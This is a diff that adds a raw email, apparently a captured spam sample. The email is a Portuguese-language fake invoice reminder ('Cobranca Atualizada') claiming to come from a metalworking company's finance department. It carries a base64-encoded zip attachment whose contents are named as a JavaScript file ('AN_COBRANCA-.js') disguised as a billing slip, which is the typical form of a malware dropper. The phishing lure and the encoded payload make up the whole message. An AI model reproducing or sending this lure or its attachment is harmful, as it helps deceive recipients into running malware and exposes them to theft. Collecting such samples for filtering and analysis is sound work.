@@ -1,0 +1,128 @@
+Received: from ip-208-113-133-66.nodes.dream.io ([208.113.133.66])
+        by [removed]; Mon, 28 Nov 2016 04:39:37 +0000 (UTC)
+Received: by ip-208-113-133-66.nodes.dream.io (Postfix, from userid 1000)
+	id CC9D620D3D; Mon, 28 Nov 2016 02:27:09 -0200 (BRST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+	d=ip-208-113-133-66.nodes.dream.io; s=mail; t=1480307689;
+	bh=BQRUN/UDN6XA9Dww1Txwtg9uDALq1uaN9/SLONd+nXE=;
+	h=To:Subject:From:Date:From;
+	b=RiRKeQoPnOfCbMzPxBbyYdLPMxnBn2WevmZB6OOX7wSs7sATmsh4r6kaEIG6rYqro
+	 Nq4woaWyFqmDSIY2rwJMXT+ieGUrkmsjyQ74IwwkigrQwagGbg5bIQnRy4uHHRB0ma
+	 +0oqDb1HL+BO/skdWW5tGZ1zHlhtJOonVoRUKKZY=
+To: [removed]
+Subject: Cobranca Atualizada   (223127)
+X-PHP-Originating-Script: 1000:javali.php
+X-Mailer: Microsoft Office Outlook, Build 17.551210
+From: Financeiro <contato@ip-208-113-133-66.nodes.dream.io>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="5d811eb216d367700569ce81e072cd82"
+Message-Id: <20161128043449.CC9D620D3D@ip-208-113-133-66.nodes.dream.io>
+Date: Mon, 28 Nov 2016 02:27:09 -0200 (BRST)
+
+Content-Transfer-Encoding: 7bit
+This is a MIME encoded message.
+
+--5d811eb216d367700569ce81e072cd82
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<META name=Generator content=5.35>
+<BODY<SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black"><title></title></HEAD>
+<BODY><STRONG>Prezado Cliente,</SPAN></B></STRONG> 
+<P></P>
+<P style="LINE-HEIGHT: normal"><B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black">Este 
+e-mail tem por objetivo lhe informar sobre o vencimento da parcela abaixo 
+relacionada que ocorrerá nos próximos dias.</SPAN></B></P>
+<P><B></B></P>
+<TABLE border=1>
+  
+  <TR>
+    <TD>Documento</TD>
+    <TD>Série</TD>
+    <TD>Parcela</TD>
+    <TD>Vencimento</TD>
+    <TD>Valor</TD></TR>
+  <TR>
+    <TD>18330</TD>
+    <TD>1</TD>
+    <TD>3</TD>
+    <TD>29/11/2016.</TD>
+    <TD>3.200,00</TD></TR></TABLE><B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black">
+<P></SPAN></B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black"><BR><B>Caso 
+não receba, segue o boleto referente a NF 157/B VENCIMENTO 29/11/2016. 
+</B></SPAN></P>
+<P><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black"><B>Obs: 
+Este material acabou de ser retirado pela transportadora.</SPAN></B><B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black">.</SPAN></B> 
+</P>
+<P style="LINE-HEIGHT: normal"><B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black">Atenciosamente,</SPAN></B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black"><BR><BR></SPAN><B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: rgb(0,112,192)">Metalporto 
+Metalúrgica Ltda</SPAN></B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: black"><BR><B>Departamento 
+Financeiro</B></SPAN><B><SPAN 
+style="FONT-SIZE: 10pt; FONT-FAMILY: 'Verdana','sans-serif'; COLOR: rgb(31,73,125)">.</SPAN></B></P></BODY></HTML>
+
+--5d811eb216d367700569ce81e072cd82
+Content-Type: application/octet-stream; name="AN_COBRANCA-13.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment
+
+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
+
+
+--5d811eb216d367700569ce81e072cd82--
